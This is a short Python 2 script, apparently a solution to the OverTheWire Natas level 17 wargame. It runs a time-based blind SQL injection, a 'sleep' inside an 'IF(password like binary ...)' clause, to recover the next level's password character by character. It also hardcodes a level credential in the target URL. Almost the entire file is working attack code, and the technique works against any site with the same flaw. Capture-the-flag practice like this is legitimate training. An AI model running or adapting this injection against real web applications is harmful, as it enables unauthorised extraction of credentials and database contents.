#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
charexist = '047dghjlmpqsvwxyCDFIKOPR' ########### THIS LINE
password = ''

target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php'

userexists = 'This user exists.'

r = requests.get(target)

if r.status_code:
	print r.status_code
	#print r.text

# like binary is case sensitive

'''
for c in chars:
	try:
		r = requests.get(target + '?username=natas18" and IF(password like binary "%' + c + '%", sleep(5), null) %23', timeout=1)
	except requests.exceptions.Timeout:
		charexist += c
		print charexist
'''

print 'Characters used in password: ' + charexist

for i in range(32):
	for c in charexist:
		try:
			r = requests.get(target + '?username=natas18" and IF(password like binary "' + password + c + '%", sleep(3), null) %23', timeout=1)
		except requests.exceptions.Timeout:
			password += c
			print password
			break
			
print 'Final password: ' + password
print 'Hacked!'
		
	
